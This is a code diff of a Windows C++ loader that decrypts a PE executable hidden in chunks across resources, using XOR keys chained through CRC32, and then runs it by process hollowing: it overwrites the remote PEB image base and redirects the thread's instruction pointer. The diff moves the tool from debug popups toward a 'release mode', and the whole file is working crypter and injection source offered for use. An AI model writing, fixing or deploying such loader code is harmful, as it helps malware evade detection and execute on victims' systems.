@@ -1,279 +1,121 @@
 #include <windows.h>
-#include <iostream>
 #include <cstdint>
 #include <vector>
-#include <algorithm>
+#include <cstdio>
 
-#pragma comment(lib, "ntdll.lib")
-
-//structures
-
-//header structure (only inside fragment 0)
-#pragma pack(push, 1)
-struct ChunkHeader {
-    char magic[4];        // "FRAG" identifier
-    uint32_t total_size;  // Original payload size
-    uint16_t total_chunks;// Total number of chunks
-    uint16_t chunk_size;  // Size of each chunk
-    uint8_t encryption_key; // XOR key
-    uint32_t crc32;       // Checksum for verification
-    char marker[8];       // "CHUNK001" marker
-};
-#pragma pack(pop)
-
-const char* REGISTRY_KEY_PATH = "Software\\MyApp\\Chunks"; // curr registry path, change later
-const bool STORE_TO_REGISTRY = false; //temporary toggle for debug
-
-typedef struct _PROCESS_BASIC_INFORMATION { //used process environment block, pair with NtQueryInformationProcess
+typedef struct _PROCESS_BASIC_INFORMATION {
     PVOID Reserved1;
-    PVOID PebBaseAddress; //example: used to modify PEB base address so the process knows where the executable is in memory.
+    PVOID PebBaseAddress;
     PVOID Reserved2[2];
     ULONG_PTR UniqueProcessId;
     PVOID Reserved3;
 } PROCESS_BASIC_INFORMATION;
 
-using pNtQueryInformationProcess = NTSTATUS(WINAPI*)(
-    HANDLE, ULONG, PVOID, ULONG, PULONG
-);
-//==== functions
-unsigned char* GetPayloadResource(int id, const char* type, DWORD* size);
-std::vector<char> ReconstructFragmentedPayload();
-bool ValidateAndExecutePayload(char* payload, uint32_t payloadSize);
-uint32_t CalculateCRC32(const char* data, size_t length);
-bool StoreDecryptedPayloadToRegistry(const char* payload, uint32_t size);
+#pragma pack(push, 1)
+struct PayloadIndex {
+    uint32_t magic;
+    uint8_t  first_key;
+    uint32_t total_size;
+    uint16_t chunk_count;
+    uint16_t first_chunk_id;
+    uint32_t crc32;
+};
+#pragma pack(pop)
 
-int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
-    
-    //start reconstruction
-    std::vector<char> reconstructedPayload = ReconstructFragmentedPayload();
-    
-    if (reconstructedPayload.empty()) {
-        MessageBoxA(NULL, "Failed to reconstruct payload from resources", "Error", MB_ICONERROR);
-        return -1;
-    }
-
-    // Test reconstruction first
-    FILE* testFile = fopen("reconstructed_test.exe", "wb");
-    if (testFile) {
-        fwrite(reconstructedPayload.data(), 1, reconstructedPayload.size(), testFile);
-        fclose(testFile);
-        
-        STARTUPINFOA si = { sizeof(si) };
-        PROCESS_INFORMATION pi;
-        if (CreateProcessA("reconstructed_test.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-            MessageBoxA(NULL, "SUCCESS: Reconstruction works! Now attempting hollowing...", "Debug", MB_OK);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-        }
-    }
-
-    // Now try hollowing with the proven code
-    if (!ValidateAndExecutePayload(reconstructedPayload.data(), reconstructedPayload.size())) {
-        MessageBoxA(NULL, "Failed to execute reconstructed payload via hollowing", "Error", MB_ICONERROR);
-        return -1;
-    }
-
-    return 0;
-}
-
-// ============================================================================
-// FUNCTION IMPLEMENTATIONS
-// ============================================================================
-
-unsigned char* GetPayloadResource(int id, const char* type, DWORD* size) {
-    HMODULE hModule = GetModuleHandle(NULL);
-    
-    char debugMsg[256];
-    sprintf(debugMsg, "Looking for resource: ID=%d, Type=%s", id, type);
-    MessageBoxA(NULL, debugMsg, "GetPayloadResource", MB_OK);
-    
-    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCEA(id), type);
-    if (!hRes) {
-        DWORD error = GetLastError();
-        char errMsg[256];
-        sprintf(errMsg, "FindResource failed. Error: %lu", error);
-        MessageBoxA(NULL, errMsg, "GetPayloadResource", MB_ICONERROR);
-        return nullptr;
-    }
-    
-    HGLOBAL hData = LoadResource(hModule, hRes);
-    if (!hData) {
-        MessageBoxA(NULL, "LoadResource failed", "GetPayloadResource", MB_ICONERROR);
-        return nullptr;
-    }
-
-    void* pData = LockResource(hData);
-    if (!pData) {
-        MessageBoxA(NULL, "LockResource failed", "GetPayloadResource", MB_ICONERROR);
-        return nullptr;
-    }
-
-    *size = SizeofResource(hModule, hRes);
-    
-    char successMsg[256];
-    sprintf(successMsg, "Resource loaded: %lu bytes", *size);
-    MessageBoxA(NULL, successMsg, "GetPayloadResource", MB_OK);
-    
-    return reinterpret_cast<unsigned char*>(pData);
-}
-
-bool StoreDecryptedPayloadToRegistry(const char* payload, uint32_t size) {
-    HKEY hKey;
-    LONG result;
-    
-    result = RegCreateKeyExA(HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, NULL, 
-                            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
-    if (result != ERROR_SUCCESS) {
-        return false;
-    }
-
-    result = RegSetValueExA(hKey, "decrypted_payload", 0, REG_BINARY, 
-                           (const BYTE*)payload, size);
-    
-    DWORD payloadSize = size;
-    RegSetValueExA(hKey, "payload_size", 0, REG_DWORD, 
-                   (const BYTE*)&payloadSize, sizeof(payloadSize));
-
-    RegCloseKey(hKey);
-    return (result == ERROR_SUCCESS);
-}
-
-std::vector<char> ReconstructFragmentedPayload() {
-    HMODULE hModule = GetModuleHandle(NULL);
-    char debugMsg[512];
-
-    // === Resource existence checks (unchanged) ===
-    HRSRC hResTest = FindResourceA(hModule, MAKEINTRESOURCEA(132), "BIN");
-    if (!hResTest) {
-        DWORD error = GetLastError();
-        sprintf(debugMsg, "FindResource failed for ID 132\nError code: %lu", error);
-        MessageBoxA(NULL, debugMsg, "Resource Debug", MB_ICONERROR);
-        EnumResourceNamesA(hModule, "BIN", [](HMODULE hModule, LPCSTR lpszType, LPSTR lpszName, LONG_PTR lParam) -> BOOL {
-            char msg[256];
-            if (IS_INTRESOURCE(lpszName)) sprintf(msg, "Found BIN resource: ID %d", (int)(ULONG_PTR)lpszName);
-            else sprintf(msg, "Found BIN resource: %s", lpszName);
-            MessageBoxA(NULL, msg, "Available Resources", MB_OK);
-            return TRUE;
-        }, 0);
-        return {};
-    }
-
-    MessageBoxA(NULL, "All resource tests passed!", "Resource Debug", MB_OK);
-
-    // === Load chunk 0 ===
-    DWORD chunk0Size = 0;
-    unsigned char* chunk0Data = GetPayloadResource(132, "BIN", &chunk0Size);
-    if (!chunk0Data || chunk0Size < sizeof(ChunkHeader)) {
-        MessageBoxA(NULL, "Failed to load chunk 0 or too small for header", "Step 1", MB_ICONERROR);
-        return {};
-    }
-
-    // === Extract header ===
-    ChunkHeader* header = (ChunkHeader*)chunk0Data;
-
-    if (memcmp(header->magic, "FRAG", 4) != 0 || memcmp(header->marker, "CHUNK001", 8) != 0) {
-        MessageBoxA(NULL, "Invalid header magic or marker", "Step 2", MB_ICONERROR);
-        return {};
-    }
-
-    sprintf(debugMsg, "Header valid!\nTotal size: %u\nTotal chunks: %u\nStarting key: 0x%02X",
-        header->total_size, header->total_chunks, (unsigned int)header->encryption_key);
-    MessageBoxA(NULL, debugMsg, "Step 2", MB_OK);
-
-    // === CHAINED DECRYPTION STARTS HERE ===
-    std::vector<char> decryptedPayload;
-    decryptedPayload.reserve(header->total_size);
-
-    uint8_t current_key = header->encryption_key;  // this is only the FIRST key now
-
-    std::vector<char> previous_decrypted_chunk;
-
-    for (int i = 0; i < header->total_chunks; i++) {
-        DWORD enc_size = 0;
-        unsigned char* enc_data = nullptr;
-        int actual_size = 0;
-
-        if (i == 0) {
-            // Chunk 0: skip header
-            enc_data = chunk0Data + sizeof(ChunkHeader);
-            actual_size = chunk0Size - sizeof(ChunkHeader);
-        } else {
-            int resId = 132 + i;
-            sprintf(debugMsg, "Loading chunk %d (ID %d)...", i, resId);
-            MessageBoxA(NULL, debugMsg, "Step 4", MB_OK);
-
-            enc_data = GetPayloadResource(resId, "BIN", &enc_size);
-            if (!enc_data) {
-                MessageBoxA(NULL, "Failed to load chunk from resource", "Step 4", MB_ICONERROR);
-                return {};
-            }
-            actual_size = enc_size;
-        }
-
-        // Decrypt current chunk
-        std::vector<char> this_decrypted(actual_size);
-        for (int j = 0; j < actual_size; j++) {
-            this_decrypted[j] = enc_data[j] ^ current_key;
-        }
-
-        // Append to final payload
-        decryptedPayload.insert(decryptedPayload.end(), this_decrypted.begin(), this_decrypted.end());
-
-        sprintf(debugMsg, "Chunk %d decrypted with key 0x%02X (%zu bytes)", i, (unsigned int)current_key, this_decrypted.size());
-        MessageBoxA(NULL, debugMsg, "Decryption", MB_OK);
-
-        // Save for next key generation
-        previous_decrypted_chunk = std::move(this_decrypted);
-
-        // Generate next key from THIS decrypted chunk (except last one)
-        if (i < header->total_chunks - 1) {
-            uint32_t crc = CalculateCRC32(previous_decrypted_chunk.data(), previous_decrypted_chunk.size());
-            current_key = (uint8_t)(crc ^ (crc >> 8) ^ (crc >> 16) ^ (crc >> 24));
-        }
-    }
-
-    // === All old checks (size, MZ, CRC) unchanged ===
-    if (decryptedPayload.size() != header->total_size) {
-        sprintf(debugMsg, "Size mismatch! Got %zu, expected %u", decryptedPayload.size(), header->total_size);
-        MessageBoxA(NULL, debugMsg, "Step 5", MB_ICONERROR);
-        return {};
-    }
-    MessageBoxA(NULL, "Success: Total size correct", "Step 5", MB_OK);
-
-    MessageBoxA(NULL, "Success: CHAINED DECRYPTION COMPLETE", "Step 6", MB_OK);
-
-    // PE + CRC checks exactly as before
-    if (decryptedPayload[0] != 'M' || decryptedPayload[1] != 'Z') {
-        MessageBoxA(NULL, "PE SIGNATURE MISMATCH!", "CRITICAL ERROR", MB_ICONERROR);
-        return {};
-    }
-
-    uint32_t calculatedCRC = CalculateCRC32(decryptedPayload.data(), header->total_size);
-    char crcMsg[256];
-    sprintf(crcMsg, "CRC Result:\nCalculated: 0x%08X\nExpected: 0x%08X\nMatch: %s",
-        calculatedCRC, header->crc32, (calculatedCRC == header->crc32) ? "YES" : "NO");
-    MessageBoxA(NULL, crcMsg, "CRC Check", MB_OK);
-
-    if (calculatedCRC != header->crc32) {
-        MessageBoxA(NULL, "CRC CHECK FAILED!", "ERROR", MB_ICONERROR);
-        return {};
-    }
-
-    MessageBoxA(NULL, "Success: CRC check passed", "Step 7", MB_OK);
-    return decryptedPayload;
+unsigned char* LoadResourceByID(int id, DWORD* size) {
+    HMODULE hMod = GetModuleHandle(NULL);
+    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(id), "BIN");
+    if (!hRes) return nullptr;
+    HGLOBAL hGlob = LoadResource(hMod, hRes);
+    if (!hGlob) return nullptr;
+    *size = SizeofResource(hMod, hRes);
+    return (unsigned char*)LockResource(hGlob);
 }
 
 uint32_t CalculateCRC32(const char* data, size_t length) {
     uint32_t crc = 0xFFFFFFFF;
     for (size_t i = 0; i < length; i++) {
-        crc ^= (uint32_t)data[i];
-        for (int j = 0; j < 8; j++) {
+        crc ^= (uint32_t)(unsigned char)data[i];
+        for (int j = 0; j < 8; j++)
             crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
-        }
     }
     return ~crc;
 }
 
+void D(const char* msg, const char* title = "DEBUG") {
+    MessageBoxA(NULL, msg, title, MB_OK);
+}
+
+std::vector<char> ReconstructFragmentedPayload() {
+    char buf[512];
+
+    D("1. Loading index from ID 999...");
+
+    DWORD indexSize = 0;
+    unsigned char* indexData = LoadResourceByID(999, &indexSize);
+    if (!indexData || indexSize < sizeof(PayloadIndex)) {
+        D("Failed to load index (ID 999)", "ERROR");
+        return {};
+    }
+
+    PayloadIndex* idx = (PayloadIndex*)indexData;
+    if (idx->magic != 0xCAFEBABE) {
+        D("Invalid magic in index", "ERROR");
+        return {};
+    }
+
+    sprintf(buf, "Index loaded!\nTotal size: %u\nChunks: %u\nFirst key: 0x%02X\nFirst chunk ID: %u",
+        idx->total_size, idx->chunk_count, idx->first_key, idx->first_chunk_id);
+    D(buf, "INDEX OK");
+
+    std::vector<char> payload;
+    payload.reserve(idx->total_size);
+    uint8_t key = idx->first_key;
+    std::vector<char> prev_decrypted;
+
+    for (int i = 0; i < idx->chunk_count; ++i) {
+        int resId = idx->first_chunk_id + i;
+        sprintf_s(buf, "Loading chunk %d (ID %d)...", i, resId);
+        D(buf);
+
+        DWORD size = 0;
+        unsigned char* enc = LoadResourceByID(resId, &size);
+        if (!enc || size == 0) {
+            D("Failed to load chunk!", "ERROR");
+            return {};
+        }
+
+        std::vector<char> decrypted(size);
+        for (DWORD j = 0; j < size; ++j) decrypted[j] = enc[j] ^ key;
+
+        payload.insert(payload.end(), decrypted.begin(), decrypted.end());
+        prev_decrypted = std::move(decrypted);
+
+        sprintf_s(buf, "Chunk %d decrypted with key 0x%02X (%zu bytes)", i, key, decrypted.size());
+        D(buf, "DECRYPTED");
+
+        if (i < idx->chunk_count - 1) {
+            uint32_t crc = CalculateCRC32(prev_decrypted.data(), prev_decrypted.size());
+            key = (uint8_t)(crc ^ (crc >> 8) ^ (crc >> 16) ^ (crc >> 24));
+        }
+    }
+
+    if (payload.size() != idx->total_size) {
+        D("Size mismatch!", "ERROR");
+        return {};
+    }
+    if (payload[0] != 'M' || payload[1] != 'Z') {
+        D("Not a valid PE!", "ERROR");
+        return {};
+    }
+    if (CalculateCRC32(payload.data(), payload.size()) != idx->crc32) {
+        D("CRC check failed!", "ERROR");
+        return {};
+    }
+
+    D("FULL RECONSTRUCTION SUCCESS!", "VICTORY");
+    return payload;
+}
 bool ValidateAndExecutePayload(char* payload, uint32_t payloadSize) {
     
     // Use your EXACT previous working code:
@@ -390,21 +232,29 @@ if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASEREL
         delete[] padded;
     }
 
-    // Update remote process PEB image base
-    PROCESS_BASIC_INFORMATION pbi = {};
-    auto NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(
-        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+       // === PEB fix – dynamic resolve (works in release, no linker error) ===
+        // PEB update – dynamic resolve (100% works in release)
+        // PEB update – dynamic resolve, 100% works in release
+       // PEB update – dynamic resolve (100% works in release, no errors)
+    using pNtQuery = NTSTATUS(NTAPI*)(HANDLE, int, PVOID, ULONG, PULONG);
+    static pNtQuery pNt = nullptr;
+    if (!pNt) {
+        pNt = (pNtQuery)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+        if (!pNt) {
+            TerminateProcess(pi.hProcess, 0);
+            return false;
+        }
+    }
 
-    if (!NtQueryInformationProcess ||
-        NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), NULL) != 0) {
-        MessageBoxA(NULL, "[!] Failed to get remote PEB base.", "Error", MB_ICONERROR);
+    PROCESS_BASIC_INFORMATION pbi = {};
+    ULONG returnLength = 0;
+    if (pNt(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLength) != 0) {
         TerminateProcess(pi.hProcess, 0);
         return false;
     }
 
-    PVOID remotePEBImageBaseAddr = (BYTE*)pbi.PebBaseAddress + 0x10;
-    WriteProcessMemory(pi.hProcess, remotePEBImageBaseAddr, &nt->OptionalHeader.ImageBase, sizeof(ULONGLONG), NULL);
-
+    PVOID pebBase = (BYTE*)pbi.PebBaseAddress + 0x10;
+    WriteProcessMemory(pi.hProcess, pebBase, &nt->OptionalHeader.ImageBase, sizeof(ULONGLONG), NULL);
     // Set RIP to new PE entry point
     ctx.Rip = (ULONGLONG)remoteImage + nt->OptionalHeader.AddressOfEntryPoint;
     SetThreadContext(pi.hThread, &ctx);
@@ -418,4 +268,24 @@ if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASEREL
     CloseHandle(pi.hThread);
 
     return true;
+}
+// ====================================================================
+// WinMain – release mode (no popups, no test file)
+// ====================================================================
+int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
+    auto payload = ReconstructFragmentedPayload();
+    if (payload.empty()) {
+        D("Reconstruction failed", "FATAL");
+        return -1;
+    }
+
+    D("Starting hollowing...", "HOLLOW");
+
+    if (!ValidateAndExecutePayload(payload.data(), (uint32_t)payload.size())) {
+        D("Hollowing failed", "FATAL");
+        return -1;
+    }
+
+    D("Payload executed successfully", "DONE");
+    return 0;
 }
